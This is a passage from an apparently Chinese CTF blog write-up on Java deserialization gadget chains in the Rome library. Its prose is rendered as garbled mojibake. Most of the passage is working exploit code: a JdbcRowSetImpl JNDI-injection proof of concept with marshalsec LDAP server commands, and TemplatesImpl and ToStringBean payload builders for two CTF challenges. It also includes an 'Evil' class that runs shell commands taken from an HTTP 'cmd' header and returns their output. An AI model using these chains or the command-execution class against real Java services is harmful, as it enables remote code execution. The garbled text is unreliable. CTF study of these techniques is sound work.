class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> object.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192350056.png" alt="image-20221116192350056"></p><h3 id="JdbcRowSetImplé“¾"><a href="#JdbcRowSetImplé“¾" class="headerlink" title="JdbcRowSetImplé“¾"></a>JdbcRowSetImplé“¾</h3><p><code>JdbcRowSetImpl</code>é“¾åˆ©ç”¨<code>JNDIæ³¨å…¥</code>æ‰€è¿›è¡Œæ”»å‡»ï¼Œæ¥æ›¿æ¢é“¾å°¾<code>TemplatesImpl.getOutputProperties()</code>æ‰€å¯¼è‡´çš„åŠ è½½æ¶æ„å­—èŠ‚ç </p><p>æ¼æ´ç‚¹ä¸º<code>JdbcRowSetImpl.getDatabaseMetaData()</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192355535.png" alt="image-20221116192355535"></p><p>è°ƒç”¨äº†connect()</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192400315.png" alt="image-20221116192400315"></p><p>è°ƒç”¨lookup(),åé¢å°±æ˜¯ä¸ªJNDIæ³¨å…¥æ”»å‡»ï¼ŒåŠå…·ä½“åœ¨è¿™é‡Œå°±ä¸åšåˆ†æäº†</p><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImplGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://localhost:2333/Calc&quot;</span>;</span><br><span class="line">        jdbcRowSet.setDataSourceName(url);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object[] tables= (Object[]) getValue(hashMap,<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">new_tables</span> <span class="operator">=</span> tables[<span class="number">0</span>];</span><br><span class="line">        setValue(new_tables,<span class="string">&quot;key&quot;</span>,equalsBean);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼€å¯ä¸€ä¸ªLDAPæœåŠ¡ï¼Œåˆ©ç”¨<a href="https://github.com/mbechler/marshalsec%EF%BC%8C%E6%94%BE%E7%BD%AE%E6%81%B6%E6%84%8F%E7%B1%BB">https://github.com/mbechler/marshalsecï¼Œæ”¾ç½®æ¶æ„ç±»</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#Calc 2333</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192408002.png" alt="image-20221116192408002"></p><h2 id="å››ã€åºåˆ—åŒ–payloadç¼©å‡"><a href="#å››ã€åºåˆ—åŒ–payloadç¼©å‡" class="headerlink" title="å››ã€åºåˆ—åŒ–payloadç¼©å‡"></a>å››ã€åºåˆ—åŒ–payloadç¼©å‡</h2><p>ä¸“é—¨å†™äº†ä¸€ç¯‡æ–‡ç« ï¼Œç§»æ­¥</p><h2 id="é™‡åŸæˆ˜â€ç–«â€2021-EasyJaba"><a href="#é™‡åŸæˆ˜â€ç–«â€2021-EasyJaba" class="headerlink" title="[é™‡åŸæˆ˜â€ç–«â€2021]EasyJaba"></a>[é™‡åŸæˆ˜â€ç–«â€2021]EasyJaba</h2><p>IndexControlleré‡Œbanäº†ä¸€äº›ç±»ï¼Œè¿™é‡Œåç¼–è¯‘ä¸å‡ºæ¥</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192414589.png" alt="image-20221116192414589"></p><p>è¦ç”¨jadxæ‰èƒ½çœ‹åˆ°</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192419456.png" alt="image-20221116192419456"></p><p>çœ‹åˆ°ä¾èµ–ä¸­æœ‰<code>Rome 1.0</code>ï¼ŒåŒæ—¶è¿™é‡Œèƒ½è°ƒç”¨<code>toString()</code>,åº”è¯¥æ˜¯æ‰“romeé“¾æ— ç–‘äº†ï¼Œè¿™é‡Œbanäº†<code>HashMap</code>å’Œ<code>BadAttributeValueExpException</code>ï¼Œä½†è¿™ä¸¤ä¸ªç±»çš„ä½œç”¨æ˜¯åœ¨Gadgetä¸­è°ƒç”¨åˆ°é‚£ä¸ªtoString()æ–¹æ³•ï¼Œè€Œè¿™é‡Œå¯ä»¥ç›´æ¥è°ƒç”¨<code>toString()</code></p><p><strong>exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.b4bycoffee;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Exp.base64Encode(bytes1);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºé¢˜ç›®ä¸å‡ºç½‘ï¼Œæ‰€ä»¥éœ€è¦å†™ä¸ªç‰¹æ®Šçš„æ¶æ„ç±»</p><p><strong>Evil</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>);</span><br><span class="line">        c = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line">        m = c.getMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">resp</span> <span class="operator">=</span> m.invoke(o);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">req</span> <span class="operator">=</span> m1.invoke(o); <span class="comment">// HttpServletRequest</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getWriter</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.ServletResponse&quot;</span>).getDeclaredMethod(<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getHeader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>).getDeclaredMethod(<span class="string">&quot;getHeader&quot;</span>,String.class);</span><br><span class="line">        getHeader.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        getWriter.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">writer</span> <span class="operator">=</span> getWriter.invoke(resp);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> (String)getHeader.invoke(req, <span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        String[] commands = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">charsetName</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;window&quot;</span>) ? <span class="string">&quot;GBK&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="string">&quot;WIN&quot;</span>)) &#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span class="string">&quot;/c&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        commands[<span class="number">2</span>] = cmd;</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next());</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;flush&quot;</span>).invoke(writer);</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;close&quot;</span>).invoke(writer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åæ•ˆæœ</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192426584.png" alt="image-20221116192426584"></p><h2 id="é•¿åŸæ¯2022-b4bycoffee"><a href="#é•¿åŸæ¯2022-b4bycoffee" class="headerlink" title="[é•¿åŸæ¯2022]b4bycoffee"></a>[é•¿åŸæ¯2022]b4bycoffee</h2><p>å‘ç°ååºåˆ—åŒ–ç‚¹å’Œrome1.7ä¾èµ–</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192431761.png" alt="image-20221116192431761"></p><p>è‡ªç„¶æƒ³åˆ°æ˜¯æ‰“romeé“¾ï¼Œä½†æ˜¯åœ¨toolsçš„<strong>AntObjectInputStream</strong>ä¸­è¿‡æ»¤æ‰äº†å¸¸ç”¨çš„å‡ ä¸ªç±»</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192436211.png" alt="image-20221116192436211"></p><p>æ²¡äº†TemplatesImplï¼Œä¸èƒ½åŠ è½½æ¶æ„å­—èŠ‚ç äº†ï¼Œä½†æ­¤é¢˜è¿›è¡Œäº†ç±»åŠ è½½ï¼Œè€Œä¸”ç›´æ¥è¿›è¡Œäº†å®ä¾‹åŒ–ï¼Œæ‰€ä»¥åªéœ€æ§åˆ¶ClassByteä¸ºæ¶æ„ç±»ï¼Œç„¶åç›´æ¥è°ƒç”¨å®ƒçš„toStringæ–¹æ³•å°±å¯ä»¥äº†</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192440252.png" alt="image-20221116192440252"></p><p><strong>exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.b4bycoffee;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.b4bycoffee.model.CoffeeBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value=&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        <span class="type">CoffeeBean</span> <span class="variable">coffeeBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CoffeeBean</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">classByte</span> <span class="operator">=</span> coffeeBean.getClass().getDeclaredField(<span class="string">&quot;ClassByte&quot;</span>);</span><br><span class="line">        classByte.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Evil.class&quot;</span>));</span><br><span class="line">        classByte.set(coffeeBean,bytes);</span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(CoffeeBean.class, coffeeBean);</span><br><span class="line"><span class="comment">//        equalsBean.beanHashCode();</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object[] tables= (Object[]) getValue(hashMap,<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">new_tables</span> <span class="operator">=</span> tables[<span class="number">0</span>];</span><br><span class="line">        setValue(new_tables,<span class="string">&quot;key&quot;</span>,equalsBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> 